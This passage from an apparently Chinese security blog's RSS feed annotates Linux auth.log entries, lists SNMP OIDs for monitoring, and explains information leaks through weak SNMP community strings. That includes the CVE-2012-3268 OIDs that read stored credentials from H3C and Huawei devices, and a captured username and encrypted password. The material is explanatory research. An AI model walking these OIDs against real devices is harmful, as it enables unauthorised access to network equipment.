&lt;p&gt;Cent OS release 5.4 文件权限是600.Ubuntu 12.04里权限是640.可见这个文件对权限要求较高。&lt;/p&gt;

&lt;h2 id='id2542'&gt;日志内容分析&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://unix.stackexchange.com/questions/27662/making-sense-of-auth-log'&gt;make sense of auth.log&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Jul 11 04:39:01 kali CRON[12434]: pam_unix(cron:session): session opened for user root by (uid=0)
Jul 11 04:39:01 kali CRON[12434]: pam_unix(cron:session): session closed for user root&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;每次crond执行一次，会产生这样一条记录。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Jul 11 04:59:42 kali sshd[12473]: Server listening on 0.0.0.0 port 22.
Jul 11 04:59:42 kali sshd[12473]: Server listening on :: port 22.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;sshd启动，监听端口&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 21 14:40:10 litsand-VirtualBox su[4533]: Successful su for root by litsand
Aug 21 14:40:10 litsand-VirtualBox su[4533]: + /dev/pts/6 litsand:root
Aug 21 14:40:10 litsand-VirtualBox su[4533]: pam_unix(su:session): session opened for user root by litsand(uid=1000)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;执行su命令,切换到root用户,产生上面的日志.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 21 14:42:39 litsand-VirtualBox su[4551]: pam_unix(su:session): session closed for user root&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;exit推出root,日志.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 21 14:44:27 litsand-VirtualBox sudo:  litsand : TTY=pts/6 ; PWD=/home/litsand ; USER=root ; COMMAND=/bin/ls
Aug 21 14:44:27 litsand-VirtualBox sudo: pam_unix(sudo:session): session opened for user root by litsand(uid=1000)
Aug 21 14:44:27 litsand-VirtualBox sudo: pam_unix(sudo:session): session closed for user root&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;执行sudo ls命令.产生的日志.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 21 14:46:48 litsand-VirtualBox su[4608]: pam_unix(su:auth): authentication failure; logname=litsand uid=1000 euid=0 tty=/dev/pts/6 ruser=litsand rhost=  user=root
Aug 21 14:46:50 litsand-VirtualBox su[4608]: pam_authenticate: Authentication failure
Aug 21 14:46:50 litsand-VirtualBox su[4608]: FAILED su for root by litsand
Aug 21 14:46:50 litsand-VirtualBox su[4608]: - /dev/pts/6 litsand:root&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;su切换到root用户失败日志.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 21 14:48:12 litsand-VirtualBox sudo: pam_unix(sudo:auth): authentication failure; logname=litsand uid=1000 euid=0 tty=/dev/pts/7 ruser=litsand rhost=  user=litsand
Aug 21 14:48:33 litsand-VirtualBox sudo:  litsand : 3 incorrect password attempts ; TTY=pts/7 ; PWD=/home/litsand ; USER=root ; COMMAND=/bin/ls
Aug 21 14:48:33 litsand-VirtualBox sudo: unable to execute /usr/sbin/sendmail: No such file or directory&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;sudo密码错误产生的日志.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 21 14:59:50 litsand-VirtualBox useradd[4815]: new group: name=test, GID=1002
Aug 21 14:59:50 litsand-VirtualBox useradd[4815]: new user: name=test, UID=1002, GID=1002, home=/home/test, shell=/bin/sh&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;执行 useradd test 产生的日志.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 21 15:06:00 litsand-VirtualBox passwd[4835]: pam_unix(passwd:chauthtok): password changed for test
Aug 21 15:06:00 litsand-VirtualBox passwd[4835]: gkr-pam: couldn&amp;#39;t update the login keyring password: no old password was entered&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;给新建的用户test添加密码的日志.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 21 15:52:06 litsand-VirtualBox userdel[4845]: delete user &amp;#39;test&amp;#39;
Aug 21 15:52:06 litsand-VirtualBox userdel[4845]: removed group &amp;#39;test&amp;#39; owned by &amp;#39;test&amp;#39;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;执行userdel test的日志.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 21 18:07:44 litsand-VirtualBox chpasswd[5248]: pam_unix(chpasswd:chauthtok): password changed for test
Aug 21 18:07:44 litsand-VirtualBox chpasswd[5248]: gkr-pam: couldn&amp;#39;t update the login keyring password: no old password was entered&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用chpasswd命令修改密码的日志&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 21 18:18:42 litsand-VirtualBox chage[5279]: changed password expiry for root&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;chage修改账户过期时间&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 22 10:59:12 litsand-VirtualBox chsh[2999]: changed user &amp;#39;root&amp;#39; shell to &amp;#39;/bin/bash&amp;#39;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;chsh修改登录shell的日志&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 22 11:03:12 litsand-VirtualBox groupadd[3014]: group added to /etc/group: name=group1, GID=1002
Aug 22 11:03:12 litsand-VirtualBox groupadd[3014]: group added to /etc/gshadow: name=group1
Aug 22 11:03:12 litsand-VirtualBox groupadd[3014]: new group: name=group1, GID=1002&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;groupadd group1产生的日志&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 22 11:04:41 litsand-VirtualBox groupmod[3019]: group changed in /etc/group (group group1/1002, new name: mygroup, new gid: 201)
Aug 22 11:04:41 litsand-VirtualBox groupmod[3019]: group changed in /etc/gshadow (group group1, new name: mygroup)
Aug 22 11:04:41 litsand-VirtualBox groupmod[3019]: group changed in /etc/passwd (group group1/1002, new name: mygroup, new gid: 201)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;groupmod -g 201 -n mygroup group1产生的日志&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 22 11:13:13 litsand-VirtualBox groupdel[3031]: group &amp;#39;mygroup&amp;#39; removed from /etc/group
Aug 22 11:13:13 litsand-VirtualBox groupdel[3031]: group &amp;#39;mygroup&amp;#39; removed from /etc/gshadow
Aug 22 11:13:13 litsand-VirtualBox groupdel[3031]: group &amp;#39;mygroup&amp;#39; removed&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;groupdel mygroup 命令&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 22 11:17:53 litsand-VirtualBox gpasswd[3067]: password of group group1 changed by root&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;gpasswd group1命令,创建群组口令.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 22 11:19:04 litsand-VirtualBox gpasswd[3072]: administrators of group group1 set by root to user1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;gpasswd -A user1 group1 设置群组管理员.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 22 11:21:41 litsand-VirtualBox gpasswd[3085]: user user1 added by user1 to group group1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;gpasswd -a user1 group1命令把用户加入群组.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Aug 22 15:07:41 litsand-VirtualBox sudo:    user1 : user NOT in sudoers ; TTY=pts/8 ; PWD=/home/litsand/test ; USER=root ; COMMAND=/bin/su -
Aug 22 15:07:41 litsand-VirtualBox sudo: unable to execute /usr/sbin/sendmail: No such file or directory&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用户不再sudoer列表中.&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/07/30/authlog-</link>
                <guid>http://username.github.io/技术研究/2013/07/30/authlog-</guid>
                <pubDate>2013-07-30T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>天融信防火墙配置网络</title>
                <description>&lt;h2 id='id2540'&gt;命令设计&lt;/h2&gt;

&lt;p&gt;其实管理ddn网和atm网络的时候，就尝试总结过交换机设备的命令的设计思路。换一种设备，就有很多新的命令，实在令人忧伤。&lt;/p&gt;

&lt;p&gt;就目前接触到的来说，都是一种层级的命令。树形结构，一级一级，慢慢定位到需要的命令。&lt;/p&gt;

&lt;h2 id='nat'&gt;配置nat&lt;/h2&gt;

&lt;p&gt;在资源管理中，添加必须的地址资源，区域资源。&lt;/p&gt;

&lt;p&gt;在防火墙 地址转换 中配置nat规则。&lt;/p&gt;

&lt;p&gt;有三种，源转换，目的转换，双向转换&lt;/p&gt;</description>
                <link>http://username.github.io/2013/07/30/</link>
                <guid>http://username.github.io/2013/07/</guid>
                <pubDate>2013-07-30T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>snmp弱口令引起的信息泄漏</title>
                <description>&lt;h2 id='0x00_snmp'&gt;0x00 snmp协议简介&lt;/h2&gt;

&lt;p&gt;snmp协议即简单网络管理协议（SNMP，Simple Network Management Protocol）。目前一共有3个版本：V1,V2c，V3。V3是最新的版本，在安全的设计上有了很大改进。不过目前广泛应用的还是存在较多安全问题的V1和V2c版本，本文讨论的内容也是基于这两个版本。&lt;/p&gt;

&lt;p&gt;了解更多&lt;a href='http://zh.wikipedia.org/wiki/SNMP'&gt;snmp协议内容可以参考维基百科&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;顾名思义，snmp是用来进行网络管理的。cacti和mrtg等监控工具都是基于snmp协议。snmp协议工作的原理简单点来说就是管理主机向被管理的主机或设备发送一个请求，这个请求包含一个community和一个oid。oid就是一个代号，代表管理主机这个请求想要的信息。比如cpu的使用率的oid可能是112,内存的使用率的oid可能是113.这个oid是约定好的。被管理的主机收到这个请求后，先看请求的community是否和自己保存的一致，如果一致，则把112代表的cpu使用率，或者113代表的内存使用率返回给管理主机。如果不一致，就不会返回任何信息。所以community相当与一个认证的口令。需要提一句的是V1和V2c版本的snmp协议都是明文传输数据的，所以可以通过抓包嗅探等手段获取认证需要的community。&lt;/p&gt;

&lt;p&gt;管理主机通过snmp协议除了可以获取被管理主机的信息，还可以修改被管理主机的一些配置信息（通常是路由器等设备）。&lt;/p&gt;

&lt;p&gt;通过上面提到的snmp的应用可以总结出snmp弱口令或者口令泄漏引起的安全问题：一是信息泄漏，二是设备的配置可能被修改从而被他人控制。本文讨论第一种情况。&lt;/p&gt;

&lt;h2 id='0x01_'&gt;0x01 通用的信息泄漏&lt;/h2&gt;

&lt;p&gt;看一下乌云的几个案例，热热身：&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.wooyun.org/bugs/wooyun-2010-06953'&gt;优酷后台访问未设置权限+snmp弱口令&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.wooyun.org/bugs/wooyun-2010-015165'&gt;蘑菇街SNMP弱口令一枚&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.wooyun.org/bugs/wooyun-2010-07862'&gt;CactiEZ 中文版snmp默认团体名&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.wooyun.org/bugs/wooyun-2010-03488'&gt;kingsoft SNMP弱口令&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;既然大家都说snmp引起信息泄漏，导致服务器可能被入侵。那我们就看看snmp到底可以泄漏那些信息吧。下面是我总结的一些泄漏敏感信息的节点oid（使用snmpwalk指令来获取信息）。欢迎补充指正。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;系统信息 1.3.6.1.2.1.1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;样例：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SNMPv2-MIB::sysDescr.0 = STRING: Linux xxoo.zwt.qihoo.net 2.6.18-164.el5xen #1 SMP Thu Sep 3 04:03:03 EDT 2009 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (1876050197) 217 days, 3:15:01.97
SNMPv2-MIB::sysContact.0 = STRING: Root &amp;lt;root@localhost&amp;gt; (configure /etc/snmp/snmp.local.conf)
SNMPv2-MIB::sysName.0 = STRING: xxoo.zwt.qihoo.net
SNMPv2-MIB::sysLocation.0 = STRING: Unknown (edit /etc/snmp/snmpd.conf)
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (0) 0:00:00.00&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;显然，这个sysDescr是系统的描述信息，这里我们看到这台机器的域名很可能是xxoo.zwt.qihoo.net,内核的版本是2.6.18-164.el5xen，系统是64位的。sysUpTimeInstance就是系统运行时间了。sysContact这里显示的是管理员的联系方式，这个例子中管理员没有配置。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;系统进程列表 1.3.6.1.2.1.25.4.2.1.2&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;样例：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;HOST-RESOURCES-MIB::hrSWRunName.11855 = STRING: &amp;quot;httpd&amp;quot;
HOST-RESOURCES-MIB::hrSWRunName.12579 = STRING: &amp;quot;vsftpd&amp;quot;
HOST-RESOURCES-MIB::hrSWRunName.14653 = STRING: &amp;quot;xinetd&amp;quot;
HOST-RESOURCES-MIB::hrSWRunName.32561 = STRING: &amp;quot;sshd&amp;quot;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里省略N多。从进程列表我们可以知道服务器上开了那些服务，有哪些有意思的进程在跑。比如这个就可以看出来，它是开了ssh的。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;系统安装软件列表 1.3.6.1.2.1.25.6.3.1.2&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;样例：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;HOST-RESOURCES-MIB::hrSWInstalledName.595 = STRING: &amp;quot;xorg-x11-xfs-1.0.2-4&amp;quot;
HOST-RESOURCES-MIB::hrSWInstalledName.598 = STRING: &amp;quot;openssh-server-4.3p2-36.el5&amp;quot;
HOST-RESOURCES-MIB::hrSWInstalledName.140 = STRING: &amp;quot;NetworkManager-glib-0.7.0-9.el5&amp;quot;
HOST-RESOURCES-MIB::hrSWInstalledName.141 = STRING: &amp;quot;gnome-mount-0.5-3.el5&amp;quot;
HOST-RESOURCES-MIB::hrSWInstalledName.143 = STRING: &amp;quot;MySQL-devel-community-5.0.81-0.rhel5&amp;quot;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同样省略N多。有耐心慢慢分析的话是可以获取很多信息的。比如这里我看可以到它的ssh是4.3p2版本的，这个版本貌似是存在缺陷的。还有装了mysql，是5.0的&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;网口的数量，类型，物理地址和流量信息等 1.3.6.1.2.1.2&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;样例：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;IF-MIB::ifNumber.0 = INTEGER: 3
IF-MIB::ifIndex.1 = INTEGER: 1
IF-MIB::ifIndex.2 = INTEGER: 2
IF-MIB::ifIndex.3 = INTEGER: 3
IF-MIB::ifDescr.1 = STRING: lo
IF-MIB::ifDescr.2 = STRING: eth0
IF-MIB::ifDescr.3 = STRING: sit0
IF-MIB::ifType.1 = INTEGER: softwareLoopback(24)
IF-MIB::ifType.2 = INTEGER: ethernetCsmacd(6)
IF-MIB::ifType.3 = INTEGER: tunnel(131)
IF-MIB::ifPhysAddress.1 = STRING: 
IF-MIB::ifPhysAddress.2 = STRING: aa:0:0:dc:5f:58
IF-MIB::ifPhysAddress.3 = STRING: 
IF-MIB::ifInOctets.1 = Counter32: 19030140
IF-MIB::ifInOctets.2 = Counter32: 4072910622
IF-MIB::ifInOctets.3 = Counter32: 0
IF-MIB::ifOutOctets.1 = Counter32: 19030140
IF-MIB::ifOutOctets.2 = Counter32: 2001152942
IF-MIB::ifOutOctets.3 = Counter32: 0&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;cacti等系统就是通过获取这些数据监控流量的。ifNumber是网口数量，ifType是网口类型，ifPhysAddress是mac地址，ifInOctets是流入的总流量，ifOutOctets是流出的总流量。等等。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;IP-MAC地址转换表 1.3.6.1.2.1.3.1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;样例：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;RFC1213-MIB::atIfIndex.2.1.x.x.o.o = INTEGER: 2
RFC1213-MIB::atPhysAddress.2.1.x.x.o.o = Hex-STRING: 28 C0 DA 05 20 00 
RFC1213-MIB::atNetAddress.2.1.x.x.o.o = Network Address: DC:B5:37:81&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我的理解应该跟执行arp -a命令的输出一样吧。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;网口的ip地址和子网掩码 1.3.6.1.2.1.4.20&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;样例：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;IP-MIB::ipAdEntAddr.127.0.0.1 = IpAddress: 127.0.0.1
IP-MIB::ipAdEntAddr.x.x.o.o = IpAddress: x.x.o.o
IP-MIB::ipAdEntIfIndex.127.0.0.1 = INTEGER: 1
IP-MIB::ipAdEntIfIndex.x.x.o.o = INTEGER: 2
IP-MIB::ipAdEntNetMask.127.0.0.1 = IpAddress: 255.0.0.0
IP-MIB::ipAdEntNetMask.x.x.o.o = IpAddress: 255.255.255.128
IP-MIB::ipAdEntBcastAddr.127.0.0.1 = INTEGER: 0
IP-MIB::ipAdEntBcastAddr.x.x.o.o = INTEGER: 1


路由表 1.3.6.1.2.1.4.21 鉴于打码太复杂，就不提供样例，可自己测试。
tcp connection table  1.3.6.1.2.1.6.13 相当与netstat -t 命令
开放的udp端口 1.3.6.1.2.1.7.5&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;此外在互联网上有两个oid被很多文章转载：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.3.6.1.4.77.1.2.25.1.1 //**用户列表
1.3.6.1.4.77.1.4.1.0 //**域名&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这两个oid都是存在的。不过测试了几台机器都没有返回任何信息。如果大家有更准确的测试结果欢迎反馈。&lt;/p&gt;

&lt;h2 id='0x02_'&gt;0x02 能不能更给力一点&lt;/h2&gt;

&lt;p&gt;耐着性子看完了上文形形色色的oid，你肯定已经知道，有了snmp的community之后，从系统内核到mac地址，路由表，到tcp connection都被我们看光光了。可是，仅仅就这个程度么？我们掌握了这么多的信息，这么多的信息，可是只靠snmp却依然无法控制这台设备。这是多么忧伤的一件事情。&lt;/p&gt;

&lt;p&gt;如果snmp不仅仅可以读system up time，如果有个oid可以读到/etc/passwd甚至可以读到/etc/shadow那该多好啊。虽然目前这仅仅是YY，但是下面将要介绍一个类似的漏洞。那就是&lt;a href='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3268'&gt;CVE-2012-3268&lt;/a&gt;.先看一下乌云案例：&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.wooyun.org/bugs/wooyun-2013-021877'&gt;中国移动H3C防火墙侧漏，利用snmp获取管理员密码，成功登录设备！&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.wooyun.org/bugs/wooyun-2013-021964'&gt;中国移动集团华为三层交换SNMP漏洞，可获取管理帐号密码，已成功登录&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.wooyun.org/bugs/wooyun-2010-032312'&gt;通过snmp获取中国移动华为防火墙交换机等设备的登录密码&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;看到没，通过特定的oid读到了设备中存储的用户名和密码，可以成功登录。&lt;/p&gt;

&lt;p&gt;关于这个cve的来龙去脉可以参考Kurt Grutzmacher发表的文章&lt;a href='http://grutztopia.jingojango.net/2012/10/hph3c-and-huawei-snmp-weak-access-to.html'&gt;HP/H3C and Huawei SNMP Weak Access to Critical Data&lt;/a&gt;。同时Kurt Grutzmacher也提供了&lt;a href='https://github.com/grutz/h3c-pt-tools'&gt;nmap和msf扫描这个漏洞的插件和破解加密密码的工具&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;长话短说，本质上这依然是snmp引起的信息泄漏，只不过这里露的过于性感，用一个只读权限的community就可以读取到登录需要的用户名和密码。目前已知可以获取帐号的oid有一下三个:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.3.6.1.4.1.2011.5.2.1.10.1
1.3.6.1.4.1.2011.10.2.12.1.1.1
1.3.6.1.4.1.25506.2.12.1.1.1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;对于存在该漏洞的设备，只需要以此walk上面3个oid就可以了。虽然厂商都发布补丁修复了这个漏洞。但是由于某些你懂的原因，存在这个漏洞的设备依然有很多很多很多很多。so：请不要将本文提供的信息用于非法用途，后果自负～～。&lt;/p&gt;

&lt;p&gt;需要说一下的是，发布这个漏洞的Kurt Grutzmacher在文章和扫描插件中只提到了后面两个oid，第一个oid是我分析@s3cur1ty提交在乌云的漏洞得出来的。感谢@s3cur1ty。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/07/26/snmp</link>
                <guid>http://username.github.io/2013/07/26/snmp</guid>
                <pubDate>2013-07-26T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>oidview使用指南</title>
                <description>&lt;p&gt;&lt;a href='http://www.oidview.com/download.html'&gt;oidview下载&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;oidview tools 有非常丰富强大的功能。比如Poll+graph可以用取到信息实时的画图。iGrid可以把网口的各种信息对应的 列成表格，非常适合阅读。&lt;/p&gt;

&lt;p&gt;需要记录一下的是关于mib库的编译和加载。需要在mib manager里编译加载之后，相关的节点和信息才会在mib browser里显示.mib browser没有显示相关节点并不代表目标机器上不支持这个节点。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/07/26/oidview</link>
                <guid>http://username.github.io/2013/07/26/oidview</guid>
                <pubDate>2013-07-26T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>CVE 2012 3268研究总结</title>
                <description>&lt;h2 id='id2538'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://grutztopia.jingojango.net/2012/10/hph3c-and-huawei-snmp-weak-access-to.html'&gt;Kurt Grutzmacher最早发布的文章&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.cvedetails.com/cve/CVE-2012-3268/'&gt;cvedetail&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.huawei.com/cn/security/psirt/security-bulletins/security-advisories/hw-u_194647.htm'&gt;安全预警-涉及华为多种产品的SNMP漏洞&lt;/a&gt;&lt;/p&gt;

&lt;h2 id='oid'&gt;漏洞相关的oid&lt;/h2&gt;

&lt;p&gt;Kurt Grutzmacher的文档中提到了25506和2011.10两种类型，&lt;a href='http://grutztopia.jingojango.net/2012/10/hph3c-and-huawei-snmp-weak-access-to.html'&gt;可以参考之前的文章&lt;/a&gt;这两种oid应该仅仅是h3c的，华为还有还有另外一些oid可以获取帐号密码。HP的没有测试。&lt;/p&gt;

&lt;p&gt;让我产生疑问的地方在&lt;a href='http://www.wooyun.org/bugs/wooyun-2010-021964'&gt;wooyun的这个漏洞&lt;/a&gt;@s3cur1ty 这里用的这个oid显然不是Kurt Grutzmacher中提到的那两种。话说这个oid确实没看懂，CNVD的回复也提到向洞主请教所使用的指令。洞主自己在回复里提到说这是华为的0day，应该算是华为私有mib泄漏。而从华为的回复的安全预警中可以到，这也是cve-2012-3268的问题。本质上就是通过一个read权限的团体字读取帐号密码。而可以读取的oid不仅仅是Kurt Grutzmacher提到的两种，比如@s3cur1ty这里提到的就是另外一个。&lt;/p&gt;

&lt;h2 id='id2539'&gt;相关测试&lt;/h2&gt;

&lt;p&gt;测试型号：ME60 V600R002C02SPC700&lt;/p&gt;

&lt;p&gt;获取帐号的oid为:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.3.6.1.4.1.2011.5.2.1.10.1.1.6.97.110.113.117.97.110 anquan 
1.3.6.1.4.1.2011.5.2.1.10.1.2.6.97.110.113.117.97.110 K2+L5&amp;quot;^N:6&amp;amp;X]&amp;amp;8.21CN&amp;amp;Q!!&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;参考s3cur1t提交的漏洞，可见华为有些设备还可以通过walk&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.3.6.1.4.1.2011.5.2.1.10.1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个节点来获取帐号密码。&lt;/p&gt;

&lt;p&gt;！&lt;a href='{site.imgurl}huawei1.png'&gt;test&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2013/07/25/cve-2012-3268</link>
                <guid>http://username.github.io/2013/07/25/cve-2012-3268</guid>
                <pubDate>2013-07-25T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>snmp oid 样例</title>
                <description>&lt;h2 id='oid'&gt;通用流量oid&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;ifNumber 1.3.6.1.2.1.2.1.0 端口数量
ifEntry 1.3.6.1.2.1.2.2.1 端口的各种信息集合
ifType 1.3.6.1.2.1.2.2.1.3 端口类型
ifAdminStatus 1.3.6.1.2.1.2.2.1.7 端口的管理状态（up/down）
ifInOctets 1.3.6.1.2.1.2.2.1.10 流入的总流量
ifOutOctets 1.3.6.1.2.1.2.2.1.16 流出的总流量&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='h3c_s5500ei'&gt;h3c S5500EI&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;hh3cEntityExtCpuUsage 1.3.6.1.4.1.25506.2.6.1.1.1.1.6.47 cpu使用率
hh3cEntityExtMemUsage 1.3.6.1.4.1.25506.2.6.1.1.1.1.8.47 内存使用率&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='mib'&gt;天融信私有mib&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;adminOnline 1.3.6.1.4.1.14331.5.5.1.4.4 在线管理员数
cpuLoad 1.3.6.1.4.1.14331.5.5.1.4.5 Cpu负载（*0.01）
memoryLoad 1.3.6.1.4.1.14331.5.5.1.4.6 系统内存占用率（*0.01）
memoryFree 1.3.6.1.4.1.14331.5.5.1.4.7 空闲内存数（bytes）
currentConnections 1.3.6.1.4.1.14331.5.5.1.4.9 系统实时连接数
cps 1.3.6.1.4.1.14331.5.5.1.4.10 系统每秒新建连接数&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='oid'&gt;天融信网口流量oid&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;ifInOctets 1.3.6.1.4.1.14331.5.5.1.5.1.16 接收字节数
ifOutOctets 1.3.6.1.4.1.14331.5.5.1.5.1.23 发出的字节数&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='sslvpn'&gt;sslvpn&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;svOnlineUser 1.3.6.1.4.1.14331.5.5.1.13.2 sslvpn 在线用户数 13.2&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='tosivinfotalbe_'&gt;tosIvInfoTalbe 表&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;1.3.6.1.4.1.14331.5.5.1.12.3

ivInfoTunnelNumber 隧道数量 12.3.1.1
ivInfoOutPkts 隧道发出总包数 12.3.1.2
ivInfoOutDrops 隧道发出丢弃包数 12.3.1.3
ivInfoOutErrors 隧道发出错误包数 12.3.1.4
ivInfoOutOctets 隧道发出总字节数 12.3.1.5
ivInfoInPkts 隧道接收总包数 12.3.1.6
ivInfoInDrops 隧道接收丢弃包数 12.3.1.7
ifInfoInErrors 隧道接收错误包数 12.3.1.8
ivInfoInOctets 隧道接收总字节数 12.3.1.9&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='tosids_'&gt;tosIDS 表&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;idsTotal 1.3.6.1.4.1.14331.5.5.1.11.1 攻击总数 11.1(还有各种具体的攻击的次数)&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='tosiftable_'&gt;tosIfTable 网卡信息表&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;1.3.6.1.4.1.14331.5.5.1.5

ifNotBad 接口有无硬件错误 5.1.11
ifInPkts 接收包数 5.1.15
ifInOctets 接收字节数 5.1.16
ifInDiscards 丢弃包数 5.1.17
ifInErrors 接收错误的包数 5.1.18
ifInDiscardsRate(x100) 丢弃包数和端口总包数的比例 5.1.16
ifInErrorsRate. (x100) 接收错误的包数和端口总包数的比例 5.1.20
ifInSpeed 进口速率 5.1.21
ifOutPkts 发出的包数 5.1.22
ifOutOctets 发出的字节数 5.1.23
ifOutDiscards 发出时丢弃的包数 5.1.24
ifOutErrors 发出时错误的包数 5.1.25
ifOutDiscardsRate(x100) 发出丢弃包和总发出包数的比例 5.1.26
ifOutErrorsRate(x100) 发出错误包和总发出包数的比例 5.1.27
ifOutSpeed 出口速率 5.1.28
ifBandInUse 带宽利用率(百分比) 5.1.29
ifRcvChkSumErr 接收报校验和错误包数 5.1.30
ifRcvL3bCast 接收 3 层广播包数 5.1.31
ifRcvOtherErrPkts 接收的其它错误包数 5.1.32
ifRcvRejectPkts 接收拒绝包数 5.1.45
ifRcvIpoptionPkts 接收带有 ip 选项包数 5.1.46
ifRcvFragPkts 拒绝和丢弃包的总数 5.1.47
ifDropPkts 丢弃包总数 5.1.48
